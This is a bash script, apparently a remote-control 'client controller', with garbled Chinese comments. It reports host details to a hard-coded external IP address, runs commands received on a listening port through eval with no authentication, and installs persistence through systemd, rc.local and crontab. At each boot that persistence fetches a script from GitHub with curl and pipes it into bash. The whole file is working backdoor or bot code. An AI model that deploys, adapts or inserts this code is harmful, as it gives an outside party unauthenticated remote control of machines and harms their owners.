#!/bin/bash

# å®Œæ•´å®¢æˆ·ç«¯æ§åˆ¶å™¨ v3.0
# æ”¯æŒè‡ªåŠ¨è¿æ¥ã€å‘½ä»¤æ‰§è¡Œã€å¼€æœºè‡ªå¯

SERVER_IP="159.138.58.239"
SERVER_PORT=25555
CLIENT_PORT=5556
HEARTBEAT_INTERVAL=30
CONFIG_FILE="/tmp/controller_client.conf"
PID_FILE="/tmp/controller_client.pid"

# é¢œè‰²å®šä¹‰
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# åˆå§‹åŒ–å®¢æˆ·ç«¯
init_client() {
    # ç”Ÿæˆåºåˆ—å·
    if [[ -r /etc/machine-id ]]; then
        SERIAL=$(cat /etc/machine-id | md5sum | cut -c1-8)
    else
        SERIAL=$(date +%s | md5sum | cut -c1-8)
    fi
    
    HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
    
    # è·å–ç³»ç»Ÿä¿¡æ¯
    if [[ -r /etc/os-release ]]; then
        source /etc/os-release
        SYSTEM_INFO="${ID:-unknown} ${VERSION_ID:-unknown}"
    else
        SYSTEM_INFO="unknown"
    fi
    
    echo "=== å®¢æˆ·ç«¯æ§åˆ¶å™¨ v3.0 ==="
    echo "åºåˆ—å·: $SERIAL"
    echo "æœåŠ¡å™¨: $SERVER_IP:$SERVER_PORT"
    echo "ç³»ç»Ÿ: $SYSTEM_INFO"
}

# æ—¥å¿—å‡½æ•°
log() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "[$timestamp] $1" >&2
}

# Bash TCPå‘é€å‡½æ•°
bash_tcp_send() {
    local data="$1"
    local ip="$2"
    local port="$3"
    
    {
        exec 3<>/dev/tcp/$ip/$port 2>/dev/null
        [[ $? -ne 0 ]] && return 1
        
        echo "$data" >&3 2>/dev/null
        sleep 0.5
        exec 3>&-
        exec 3<&-
        return 0
    } 2>/dev/null
}

# Bash TCPç›‘å¬å‡½æ•°
bash_tcp_listen() {
    local port="$1"
    
    {
        timeout 5 bash -c "
            exec 3<>/dev/tcp/0.0.0.0/$port 2>/dev/null
            [[ \$? -ne 0 ]] && exit 1
            read -r data <&3
            echo \"\$data\"
            exec 3>&-
            exit 0
        " 2>/dev/null
    }
}

# å‘é€å¿ƒè·³
send_heartbeat() {
    local heartbeat_data="HEARTBEAT|$SERIAL|$HOSTNAME|$SYSTEM_INFO"
    
    if bash_tcp_send "$heartbeat_data" "$SERVER_IP" "$SERVER_PORT"; then
        log "âœ… å¿ƒè·³æˆåŠŸ"
        return 0
    else
        log "âŒ å¿ƒè·³å¤±è´¥"
        return 1
    fi
}

# æ‰§è¡Œå‘½ä»¤
execute_command() {
    local command="$1"
    log "æ‰§è¡Œå‘½ä»¤: $command"
    
    # åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œ
    (
        result=$(eval "$command" 2>&1)
        log "å‘½ä»¤ç»“æœ: $result"
        echo "$result"
    ) &
}

# æ‰§è¡Œè„šæœ¬
execute_script() {
    local script_name="$1"
    
    case "$script_name" in
        "system_info.sh")
            echo "=== ç³»ç»Ÿä¿¡æ¯ ==="
            echo "ä¸»æœºå: $HOSTNAME"
            echo "åºåˆ—å·: $SERIAL" 
            echo "ç³»ç»Ÿ: $SYSTEM_INFO"
            echo "å†…æ ¸: $(uname -r)"
            echo "æ¶æ„: $(uname -m)"
            echo "ä¸Šçº¿æ—¶é—´: $(uptime -p 2>/dev/null || uptime)"
            echo "å†…å­˜:"
            free -h 2>/dev/null || cat /proc/meminfo | head -3
            ;;
        "restart_services.sh")
            echo "é‡å¯ç³»ç»ŸæœåŠ¡..."
            systemctl restart networking 2>/dev/null || systemctl restart network 2>/dev/null
            systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null
            echo "æœåŠ¡é‡å¯å®Œæˆ"
            ;;
        "update_system.sh")
            echo "å¼€å§‹ç³»ç»Ÿæ›´æ–°..."
            if command -v apt-get &>/dev/null; then
                apt-get update && apt-get upgrade -y
            elif command -v yum &>/dev/null; then
                yum update -y
            elif command -v dnf &>/dev/null; then
                dnf update -y
            fi
            echo "ç³»ç»Ÿæ›´æ–°å®Œæˆ"
            ;;
        "network_info.sh")
            echo "=== ç½‘ç»œä¿¡æ¯ ==="
            ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "æ— æ³•è·å–ç½‘ç»œä¿¡æ¯"
            ;;
        *)
            echo "æœªçŸ¥è„šæœ¬: $script_name"
            echo "å¯ç”¨è„šæœ¬: system_info.sh, restart_services.sh, update_system.sh, network_info.sh"
            ;;
    esac
}

# å¤„ç†å‘½ä»¤
process_command() {
    local command_data="$1"
    
    if [[ "$command_data" == COMMAND:* ]]; then
        local cmd="${command_data#COMMAND:}"
        execute_command "$cmd"
    elif [[ "$command_data" == SCRIPT:* ]]; then
        local script_name="${command_data#SCRIPT:}"
        execute_script "$script_name"
    else
        log "æœªçŸ¥å‘½ä»¤: $command_data"
    fi
}

# å‘½ä»¤ç›‘å¬å™¨
start_listener() {
    log "å¯åŠ¨å‘½ä»¤ç›‘å¬å™¨ç«¯å£: $CLIENT_PORT"
    
    while true; do
        local command_data=$(bash_tcp_listen "$CLIENT_PORT")
        
        if [[ -n "$command_data" ]]; then
            log "æ”¶åˆ°å‘½ä»¤: $command_data"
            process_command "$command_data"
        fi
        
        sleep 1
    done
}

# ä¸»å®ˆæŠ¤è¿›ç¨‹
start_daemon() {
    log "å¯åŠ¨å®¢æˆ·ç«¯å®ˆæŠ¤è¿›ç¨‹"
    
    local heartbeat_count=0
    local success_count=0
    
    # å¯åŠ¨å‘½ä»¤ç›‘å¬å™¨
    start_listener &
    local listener_pid=$!
    
    # ä¸»å¿ƒè·³å¾ªç¯
    while true; do
        heartbeat_count=$((heartbeat_count + 1))
        
        if send_heartbeat; then
            success_count=$((success_count + 1))
        fi
        
        # æ¯10æ¬¡å¿ƒè·³æ˜¾ç¤ºçŠ¶æ€
        if [[ $((heartbeat_count % 10)) -eq 0 ]]; then
            local rate=$((success_count * 100 / heartbeat_count))
            log "è¿è¡ŒçŠ¶æ€: ${heartbeat_count}æ¬¡å¿ƒè·³, ${success_count}æ¬¡æˆåŠŸ (${rate}%)"
        fi
        
        sleep "$HEARTBEAT_INTERVAL"
    done
    
    # æ¸…ç†
    kill $listener_pid 2>/dev/null
}

# è®¾ç½®å¼€æœºè‡ªå¯
setup_autostart() {
    log "è®¾ç½®å¼€æœºè‡ªå¯..."
    
    # æ–¹æ³•1: systemd
    if command -v systemctl &>/dev/null && [[ -w /etc/systemd/system ]]; then
        local service_file="/etc/systemd/system/controller-client.service"
        cat > "$service_file" << EOF
[Unit]
Description=Controller Client
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "curl -sSL https://raw.githubusercontent.com/xzx3344521/dock/refs/heads/main/client.sh | bash"
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl enable controller-client
        log "âœ… systemdè‡ªå¯è®¾ç½®å®Œæˆ"
        return 0
    fi
    
    # æ–¹æ³•2: rc.local
    if [[ -w /etc/rc.local ]]; then
        grep -q "controller-client" /etc/rc.local || {
            echo "curl -sSL https://raw.githubusercontent.com/xzx3344521/dock/refs/heads/main/client.sh | bash &" >> /etc/rc.local
        }
        log "âœ… rc.localè‡ªå¯è®¾ç½®å®Œæˆ"
        return 0
    fi
    
    # æ–¹æ³•3: crontab
    if command -v crontab &>/dev/null; then
        (crontab -l 2>/dev/null | grep -v "controller-client"; \
         echo "@reboot curl -sSL https://raw.githubusercontent.com/xzx3344521/dock/refs/heads/main/client.sh | bash") | crontab -
        log "âœ… crontabè‡ªå¯è®¾ç½®å®Œæˆ"
        return 0
    fi
    
    log "âš ï¸ æ— æ³•è®¾ç½®å¼€æœºè‡ªå¯"
    return 1
}

# æµ‹è¯•è¿æ¥
test_connection() {
    log "æµ‹è¯•æœåŠ¡å™¨è¿æ¥..."
    
    if bash_tcp_send "TEST|$SERIAL" "$SERVER_IP" "$SERVER_PORT"; then
        log "âœ… æœåŠ¡å™¨è¿æ¥æµ‹è¯•æˆåŠŸ"
        return 0
    else
        log "âŒ æœåŠ¡å™¨è¿æ¥æµ‹è¯•å¤±è´¥"
        return 1
    fi
}

# ä¸»å‡½æ•°
main() {
    init_client
    
    # è®¾ç½®å¼€æœºè‡ªå¯
    setup_autostart
    
    # æµ‹è¯•è¿æ¥
    if test_connection; then
        log "ğŸ‰ è¿æ¥æˆåŠŸ! å¼€å§‹å®ˆæŠ¤è¿›ç¨‹..."
        start_daemon
    else
        log "ğŸ’¥ è¿æ¥å¤±è´¥ï¼Œé€€å‡º"
        exit 1
    fi
}

# ä¿¡å·å¤„ç†
trap 'log "å®¢æˆ·ç«¯åœæ­¢"; exit 0' INT TERM

# å¯åŠ¨
main
